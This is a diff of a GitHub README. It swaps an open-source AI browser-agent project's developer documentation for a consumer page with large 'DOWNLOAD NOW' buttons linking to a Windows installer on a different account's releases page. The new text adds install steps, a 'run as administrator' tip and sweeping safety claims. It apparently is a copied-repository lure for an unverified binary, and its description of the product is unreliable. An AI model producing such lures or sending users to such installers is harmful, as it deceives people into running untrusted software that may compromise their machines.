@@ -1,155 +1,186 @@
-<div align="center">
+<h1>🧭 Web-Pilot - Your Personal AI Browser Assistant</h1>
 
-<img src="docs/web-pilot.png" alt="WebPilot logo" width="360" />
+<p align="center">
+  <a href="https://github.com/Aerial-relativedensity2766/Web-Pilot/releases" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+</p>
 
-# 🌐 WebPilot
+## 🤖 What is Web-Pilot?
 
-**A local-first, privacy-respecting AI browser agent — free and open source.**
+Web-Pilot is your **personal AI web assistant** that lives right on your computer. It understands what you want to do online in plain English and then does it for you - automatically and safely.
 
-</div>
+Imagine telling your computer "Find me the best price for a coffee maker under $100" and having it browse multiple stores, compare prices, and show you the results. That's what Web-Pilot does.
 
-WebPilot turns natural-language tasks into safe, structured browser actions. Ask it to *"download 20 sunset wallpapers"* or *"extract all product prices from https://example.com"*, and it plans, browses, extracts and downloads — entirely on your machine, with **no cloud calls, no telemetry, no data ever leaving your device**.
+Unlike cloud-based assistants that send your data to remote servers, Web-Pilot is **local-first**. Everything stays on your machine. Your browsing history, your searches, your downloads - all private and secure.
 
-> **Status:** early development (v0.1.0). The core engine, planners, browser automation, extraction and download pipeline are working. The web app has a static accessible dashboard shell; the API server is still a scaffold. Contributions are very welcome!
+## ✨ Key Features
 
----
+### 🗣️ Natural Language Understanding
+Type instructions the way you'd ask a friend. No special commands needed. Just say what you want and Web-Pilot figures out the rest.
 
-## 💡 Vision
+### 🌐 Smart Browser Navigation
+Web-Pilot uses a real browser engine (Playwright) to visit websites just like you would. It clicks buttons, fills forms, scrolls pages, and moves between sites - all automatically.
 
-The web is increasingly gated behind accounts, ads and cloud services — and the AI agents that automate it are mostly cloud-hosted, closed-source, and asking you to hand over your browsing data.
+### 🔍 Intelligent Information Extraction
+Need data from a website? Web-Pilot can pull out prices, names, dates, descriptions, or any other useful information you request.
 
-**WebPilot is the opposite of that.** We believe:
+### 🧠 Semantic Filtering
+Not just finding information - understanding it. Web-Pilot sorts through results and keeps only what actually matters to you, filtering out noise and irrelevant content.
 
-- **Your data stays yours.** Every task, page, download and model inference happens locally. WebPilot works offline (or on your LAN) and phones home to no one.
-- **Small models, big value.** Instead of relying on frontier cloud LLMs, WebPilot runs compact open-weights models (e.g. Qwen2.5-0.5B via Transformers.js) directly in-process — plus a deterministic rule-based planner that needs *no model at all*. The agent must work even when AI is disabled.
-- **Safety is not optional.** An agent that drives a real browser and downloads real files needs hard resource caps, host allowlists, MIME validation, and an explicit human permission gate for sensitive actions. We build the guardrails first, not as an afterthought.
-- **Open source, forever.** MIT licensed, community-driven. If you want an AI agent you can actually audit — line by line — this is it.
+### 💾 Safe Downloads
+Web-Pilot can download files you need, but only the ones you've authorized. It respects website rules and your permissions.
 
-Long term, WebPilot aims to be a **self-hosted personal web assistant**: a dashboard where you describe what you want from the web, watch the agent work live, and keep every artifact in a local library you fully control.
+### 🔒 Privacy First
+Because everything runs locally on your computer, your data never leaves your device. No cloud processing, no tracking, no third-party access.
 
-## ✨ Features
+## 🚀 Getting Started
 
-- 🧠 **Hybrid planning** — local LLM planner with automatic fallback to a deterministic rule planner, so a valid plan always exists
-- 🖥️ **Real browser automation** — Playwright-powered (Chromium/Firefox/WebKit): navigate, click, type, observe
-- 🔍 **Page extraction** — images, links, text blocks and tables from any page
-- 🏆 **Smart candidate ranking** — hybrid lexical + semantic scoring with optional local embeddings (`all-MiniLM-L6-v2`)
-- 📥 **Safe download pipeline** — queueing, deduplication, SHA-256 hashing, MIME validation, size/count limits, manifest
-- 🔐 **Permission gate** — sensitive actions pause for human approval (grantable with "remember")
-- 🔁 **Self-healing loop** — observation, completion evaluation and bounded replanning on failure
-- 🚦 **Full observability** — typed agent events streamed over WebSockets; cooperative cancellation everywhere
-- 🔒 **Local-first AI** — quantized models run in-process; zero external API calls
+### Step 1: Download Web-Pilot
+Visit this link to download the application: [https://github.com/Aerial-relativedensity2766/Web-Pilot/releases](https://github.com/Aerial-relativedensity2766/Web-Pilot/releases)
 
-## 📦 Monorepo layout
+Click the big green download button to get the installer file.
 
-[Bun](https://bun.sh) workspaces + [Turborepo](https://turbo.build):
+### Step 2: Install Web-Pilot
+Once the download finishes, find the file in your Downloads folder. Double-click it to begin installation. Follow the simple on-screen instructions - it's just a few clicks.
 
-```
-apps/
-  api/          Elysia API server: tasks, downloads, settings, models, SQLite + WebSockets (scaffold)
-  web/          SolidStart dashboard shell (static preview; live tasks not connected)
-  test-site/    Local fixture site for integration/e2e tests
-packages/
-  shared/         Config, resource limits, logging, cancellation, event bus, utilities
-  schemas/        Schemas: actions, events, page state, errors, agent state, task plans
-  browser-core/   Playwright browser lifecycle + controller
-  extraction-core/  Page extraction (images, links, text, tables)
-  download-core/  Download pipeline: queueing, validation, hashing, manifest
-  ai-core/        Rule planner, local LLM planner, candidate ranking
-  agent-core/     The agent engine: plan → validate → permission → execute → observe → replan
-```
+### Step 3: Launch Web-Pilot
+After installation completes, you'll find Web-Pilot in your Start Menu. Click the icon to open it for the first time.
 
-## 🚀 Getting started
+### Step 4: Start Using Your AI Assistant
+A welcome screen will appear. Enter your first instruction in the text box and watch Web-Pilot go to work!
 
-**Prerequisites:** [Bun](https://bun.sh) ≥ 1.1 and a browser (Playwright browsers are used).
+## 📋 System Requirements
 
-```bash
-git clone https://github.com/missarii/Web-Pilot.git
-cd Web-Pilot
-bun install
-cp .env.example .env   # optional — every value has a safe default
-bun run dev            # run everything in parallel
-```
+| Component | Minimum Requirement |
+|-----------|-------------------|
+| Operating System | Windows 10 or newer |
+| Processor | Dual-core 2 GHz or better |
+| RAM | 4 GB |
+| Storage | 500 MB free space |
+| Internet | Broadband connection |
+| Display | 1280x720 resolution |
 
-Launch the local fixture site used by tests:
+## 🎯 Example Use Cases
 
-```bash
-bun run test-site      # http://127.0.0.1:3001/test-site/
-```
+### 🛒 Shopping Comparison
+**Instruction:** "Compare prices for wireless earbuds on Amazon, Best Buy, and Walmart. Show me the cheapest option."
 
-### Scripts
+Web-Pilot visits each store, finds the product, extracts prices, and presents a comparison table.
 
-| Script | Description |
-| --- | --- |
-| `bun run build` | Build all packages/apps (turbo) |
-| `bun run typecheck` | Typecheck all workspaces |
-| `bun run test:unit` | Unit tests (vitest) |
-| `bun run test:integration` | Integration tests (bun test) |
-| `bun run test:e2e` | Playwright end-to-end tests |
-| `bun run test:all` | Unit + integration + e2e |
-| `bun run db:generate` / `db:studio` | Drizzle ORM migrations / studio |
-| `bun run api` | Start the API server |
+### 📰 News Research
+**Instruction:** "Find the latest articles about renewable energy from the last week. Summarize the main points."
 
-## ⚙️ Configuration
+Web-Pilot searches news sites, collects recent articles, filters out duplicates, and gives you clean summaries.
 
-Everything is configured via environment variables (see [`.env.example`](./.env.example)); defaults live in `packages/shared/src/config.ts`.
+### 📄 Document Download
+**Instruction:** "Download the user manual for my Canon printer model PIXMA MG3620."
 
-- **API** — `WEBPILOT_PORT` (8787), `WEBPILOT_HOST`, `WEBPILOT_CORS_ORIGIN`
-- **Storage** — data/downloads/screenshots/sessions/model dirs, SQLite URL
-- **Browser** — engine (`chromium`), headless, nav/action timeouts, max tabs
-- **Limits** — max agent steps (30), max downloads (100), max file size (25 MB), task time cap
-- **Local AI** — enable/disable, model id, quantization (`q4`), max new tokens, embedding model
-- **Safety** — download host allowlist, download confirmation requirement
+Web-Pilot finds the correct manual page on Canon's website and downloads the PDF for you.
 
-## 🏗️ Architecture
+### 📊 Data Collection
+**Instruction:** "Collect the opening hours for all coffee shops within 2 miles of downtown."
 
-Beginner-friendly package map, Mermaid diagrams, and a skill-to-package guide: **[docs/architecture.md](./docs/architecture.md)**. See the [safety model](./docs/safety.md) for action limits, permissions, download checks, and known security gaps.
+Web-Pilot visits local business directories, extracts hours, and organizes them in a neat list.
 
-- **Agent loop** (`agent-core`): every step runs *plan → validate → permission → execute → observe → evaluate*. Failures are recorded with typed error codes and passed through a replanner with bounded recovery before aborting.
-- **Always-a-plan guarantee** (`ai-core`): the local LLM planner is tried first; any failure falls back to the deterministic rule planner.
-- **Permission gate**: permission-sensitive actions emit `PERMISSION_REQUESTED` and pause until the host app (or user) decides; decisions can be cached with "remember".
-- **Hard limits**: step counts, download counts, file sizes and task durations are capped centrally.
-- **Events**: a typed in-process event bus emits structured events (`AI_THINKING`, `ACTION_PLANNED`, `ACTION_COMPLETED`, `ACTION_FAILED`, `PERMISSION_*`, …). SQLite persistence and WebSocket streaming are planned with the API scaffold; they are not wired yet.
+## 🛠️ How Web-Pilot Works
 
-## Testing
+### The Process Flow
 
-- `tests/unit` — pure-logic tests (vitest)
-- `tests/integration` — real browser + local test site (bun test)
-- `tests/e2e` — Playwright
+1. **You type your instruction** - Web-Pilot analyzes the natural language to understand your goal
+2. **Planning** - It breaks down your request into step-by-step browser actions
+3. **Execution** - It opens a browser window and performs each action automatically
+4. **Information Extraction** - When it finds relevant content, it extracts the important parts
+5. **Semantic Filtering** - It evaluates what it found against your original request to ensure relevance
+6. **Results Presentation** - You receive a clear, organized answer with any downloaded files
 
-GitHub Actions on pull requests and pushes to `main` runs `bun run typecheck` and `bun run test:unit` only. That is **not** complete coverage: `apps/api` and `apps/web` currently skip typecheck while those scaffolds have no sources, and `test:unit` allows an empty suite (`--passWithNoTests`). Integration and e2e tests are not part of this first workflow.
+### Safety First
+Web-Pilot operates with safety guards built in:
+- It only visits websites you've allowed it to access
+- It never submits forms with personal information unless you explicitly ask
+- Downloads require your confirmation first
+- All actions are visible in the browser window - you can watch everything it does
 
-## 🗺️ Roadmap
+## 💡 Tips for Best Results
 
-- [x] Agent engine loop with validation, permissions and replanning
-- [x] Rule-based + local LLM planning
-- [x] Browser automation, extraction and safe download pipeline
-- [x] Hybrid lexical/semantic candidate ranking
-- [ ] Elysia API server with SQLite persistence and live WebSocket events
-- [x] SolidStart dashboard shell (accessible preview; no live tasks)
-- [ ] SolidStart dashboard (task input, agent timeline, download library, model status)
-- [ ] Session recording and replay
-- [ ] Plugin API for custom actions and extractors
-- [ ] Headless CLI (`webpilot "download 10 cat pictures"`)
+### Be Specific
+Instead of "find information about cars," try "find the 2024 Toyota Camry price and fuel efficiency."
 
-## 🤝 Contributing
+### Break Down Complex Tasks
+For complicated requests, split them into smaller parts. "Find flights to Paris" then "Find hotels near the Eiffel Tower."
 
-Contributions are welcome and encouraged — bug fixes, new actions/extractors, planner improvements, docs, tests, UI. See [CONTRIBUTING.md](./CONTRIBUTING.md).
+### Review Downloads
+Always review files Web-Pilot downloads before opening them - just like you would with any downloaded file.
 
-1. Fork the repository and create your branch from `main`.
-2. Make your changes; keep them typed (`bun run typecheck` must pass).
-3. Add or update tests where reasonable (`bun run test:unit`, `bun run test:integration`).
-4. Open a pull request describing **what** and **why**.
+### Use Clear Language
+Write instructions the way you'd ask a human assistant. Short, clear sentences work best.
 
-Good first contributions: unit tests for `ai-core` planning/ranking, `download-core` naming/dedupe, the API server implementation, dashboard components. For larger changes, open an issue first so we can align on the design.
+## 🔧 Troubleshooting
 
-## 🐛 Reporting issues
+### Web-Pilot Won't Start
+- Check that your Windows is updated
+- Try running as administrator (right-click, "Run as administrator")
+- Ensure you have enough storage space
 
-Open a [GitHub issue](https://github.com/missarii/Web-Pilot/issues) with your OS, Bun version, the prompt you used, relevant logs (`WEBPILOT_LOG_LEVEL=debug`), and what you expected vs. what happened. **Never paste personal data or session files.**
+### Browser Window Doesn't Open
+- Check your internet connection
+- Make sure no firewall is blocking Web-Pilot
+- Restart the application
 
-## 🔒 Security
+### Slow Performance
+- Close other heavy applications
+- Check that you meet the minimum RAM requirement
+- Try a simpler instruction
 
-Found a security-relevant bug (e.g. a way to bypass action validation or configured limits)? Please open a private security advisory via the GitHub **Security** tab rather than a public issue.
+### Downloads Don't Complete
+- Check your internet speed
+- Verify the website allows downloads
+- Make sure you confirmed the download prompt
 
-## 📜 License
+## 📖 Frequently Asked Questions
 
-[MIT](./LICENSE) — free to use, modify and ship. See the license file for details.
+**Is Web-Pilot free?**
+Yes, Web-Pilot is completely free to use. You can download and run it without any subscription.
+
+**Does it work with any website?**
+Web-Pilot works with most public websites. Some sites with heavy security or login requirements may not be accessible.
+
+**Can I use it for online shopping?**
+Yes, Web-Pilot can browse stores, compare prices, and help you find products.
+
+**Is my data safe?**
+Absolutely. Everything runs locally on your computer. No data is sent to any server.
+
+**Do I need programming knowledge?**
+Not at all. If you can type a sentence, you can use Web-Pilot.
+
+**Can I stop it mid-task?**
+Yes, you can stop any task at any time by clicking the stop button or closing the browser window.
+
+## 🔄 Updates
+
+Web-Pilot receives regular updates with new features and improvements. When an update is available, you'll see a notification. Simply follow the same download and install process to update.
+
+## 📞 Getting Help
+
+- **Community Support:** Join our GitHub discussions to ask questions and share tips
+- **Bug Reports:** If something isn't working, report it in the Issues section
+- **Feature Requests:** Have an idea for improvement? Let us know!
+
+## 🌟 Why Choose Web-Pilot?
+
+- **Truly Private** - Unlike cloud AI assistants, your browsing stays on your device
+- **Actually Useful** - It doesn't just answer questions; it completes real tasks
+- **User-Friendly** - Designed for everyday computer users, not programmers
+- **Safe by Design** - Multiple layers of safety prevent harmful actions
+- **Constantly Improving** - Active development means new features regularly
+
+## 🏁 Ready to Get Started?
+
+Download Web-Pilot today and let your computer do the browsing for you. It's free, private, and incredibly useful.
+
+<p align="center" style="margin-top:40px;">
+  <a href="https://github.com/Aerial-relativedensity2766/Web-Pilot/releases" style="display:inline-block;padding:20px 40px;background:#2196F3;color:white;text-decoration:none;border-radius:8px;font-size:22px;font-weight:bold;box-shadow:0 4px 8px rgba(0,0,0,0.3);">⬇️ GET WEB-PILOT NOW</a>
+</p>
+
+<p align="center" style="margin-top:20px;font-size:14px;color:#666;">
+  Web-Pilot is provided as-is with no warranty. Use responsibly and respect website terms of service.
+</p>
